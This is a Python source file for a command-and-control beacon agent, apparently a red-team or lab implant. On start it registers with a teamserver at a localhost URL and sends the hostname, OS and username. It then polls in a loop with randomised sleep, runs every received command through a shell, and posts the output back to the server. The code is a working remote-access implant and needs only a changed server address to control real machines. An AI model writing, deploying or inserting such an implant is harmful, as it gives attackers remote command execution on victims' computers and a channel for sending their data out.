import getpass
import platform
import random
import subprocess
import time
import uuid

import requests

SERVER_URL = "http://127.0.0.1:8000"
AGENT_ID = str(uuid.uuid4())[:8]


def register():
    payload = {
        "agent_id": AGENT_ID,
        "hostname": platform.node(),
        "os": platform.system(),
        "user": getpass.getuser(),
        "ip": "127.0.0.1",
    }

    try:
        response = requests.post(
            f"{SERVER_URL}/api/v1/beacon/register",
            json=payload,
            timeout=5,
        )
        response.raise_for_status()

        print(f"[+] Registered Agent ID: {AGENT_ID}")
        return response.json()

    except requests.exceptions.RequestException as exc:
        print(f"[-] Registration failed: {exc}")
        return None


def execute_command(command: str):
    try:
        process = subprocess.run(
            command,
            shell=True,
            capture_output=True,
            text=True,
            timeout=15,
        )

        output = process.stdout if process.stdout else process.stderr
        return output, process.returncode

    except subprocess.TimeoutExpired:
        return "Command timed out after 15 seconds.", 124

    except Exception as exc:
        return str(exc), 1


def poll_once():
    response = requests.post(
        f"{SERVER_URL}/api/v1/beacon/poll",
        json={"agent_id": AGENT_ID},
        timeout=5,
    )

    response.raise_for_status()
    return response.json().get("task")


def submit_result(task_id, output, exit_code):
    payload = {
        "task_id": task_id,
        "agent_id": AGENT_ID,
        "output": output,
        "exit_code": exit_code,
    }

    response = requests.post(
        f"{SERVER_URL}/api/v1/beacon/result",
        json=payload,
        timeout=5,
    )

    response.raise_for_status()


def beacon_loop():
    print(f"[*] Starting beacon polling loop for {AGENT_ID}...")

    while True:
        try:
            task = poll_once()

            if task:
                task_id = task.get("task_id")
                command = task.get("command")

                if not task_id or not command:
                    print("[-] Received malformed task.")
                else:
                    print(f"[*] Received Task [{task_id}]")

                    output, exit_code = execute_command(command)

                    submit_result(
                        task_id,
                        output,
                        exit_code,
                    )

                    print(f"[+] Posted results for Task [{task_id}]")
            else:
                print("[*] No task available.")

        except requests.exceptions.RequestException as exc:
            print(f"[-] Teamserver request failed: {exc}")

        except Exception as exc:
            print(f"[-] Unexpected agent error: {exc}")

        sleep_duration = random.uniform(4.0, 8.0)
        time.sleep(sleep_duration)


if __name__ == "__main__":
    if register():
        beacon_loop()
